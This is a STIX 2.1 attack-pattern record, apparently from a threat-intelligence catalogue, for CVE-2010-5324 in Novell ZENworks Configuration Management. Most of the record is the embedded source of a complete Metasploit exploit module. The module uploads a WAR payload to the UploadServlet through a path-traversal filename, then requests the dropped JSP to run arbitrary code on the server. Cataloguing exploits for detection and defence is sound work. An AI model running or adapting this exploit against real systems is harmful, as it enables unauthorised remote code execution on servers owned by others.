{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8eece48-4f3c-42f1-9ae4-cec228418bf7",
    "created": "2024-08-14T16:54:50.72993Z",
    "modified": "2024-08-14T16:54:50.729934Z",
    "name": "Novell ZENworks Configuration Management Remote Execution",
    "description": " This module exploits a code execution flaw in Novell ZENworks Configuration Management 10.2.0. By exploiting the UploadServlet, an attacker can upload a malicious file outside of the TEMP directory and then make a secondary request that allows for arbitrary code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/zenworks_uploadservlet.rb",
            "external_id": "zenworks_uploadservlet.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-5324"
        },
        {
            "source_name": "reference",
            "url": "http://tucanalamigo.blogspot.com/2010/04/pdc-de-zdi-10-078.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=7005573"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Novell ZENworks Configuration Management Remote Execution',\n      'Description' => %q{\n          This module exploits a code execution flaw in Novell ZENworks Configuration Management 10.2.0.\n        By exploiting the UploadServlet, an attacker can upload a malicious file outside of the TEMP directory\n        and then make a secondary request that allows for arbitrary code execution.\n      },\n      'Author'      => [ 'MC' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2010-5324' ],\n          [ 'OSVDB', '63412' ],\n          [ 'BID', '39114' ],\n          [ 'ZDI', '10-078' ],\n          [ 'URL', 'http://tucanalamigo.blogspot.com/2010/04/pdc-de-zdi-10-078.html' ],\n          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7005573' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ java linux win },\n      'Targets'     =>\n        [\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ],\n          [ 'Windows x86',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            },\n          ],\n          [ 'Linux x86', # should work but untested\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-03-30'))\n  end\n\n  def exploit\n\n    # Generate the WAR containing the EXE containing the payload\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n    jsp_name = rand_text_alphanumeric(8+rand(8))\n\n    war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s\n\n    res = send_request_cgi({\n      'uri'       => '/zenworks/UploadServlet',\n      'method'    => 'POST',\n      'data'      => war_data,\n      'headers'   => {\n        'Content-Type' => 'application/octet-stream',\n      },\n      'encode_params' => false,\n      'vars_get'  => {\n        'filename' => \"../../webapps/#{app_base}.war\"\n      }\n    })\n\n    print_status(\"Uploading #{war_data.length} bytes as #{app_base}.war ...\")\n\n    select(nil, nil, nil, 20)\n\n    if (res && res.code == 200)\n      print_status(\"Triggering payload at '/#{app_base}/#{jsp_name}.jsp' ...\")\n        send_request_raw(\n          {\n            'uri'    => \"/#{app_base}/\" + \"#{jsp_name}\" + '.jsp',\n            'method' => 'GET',\n          })\n    else\n      print_error(\"Denied...\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-30",
    "x_mitre_platforms": [
        "linux"
    ]
}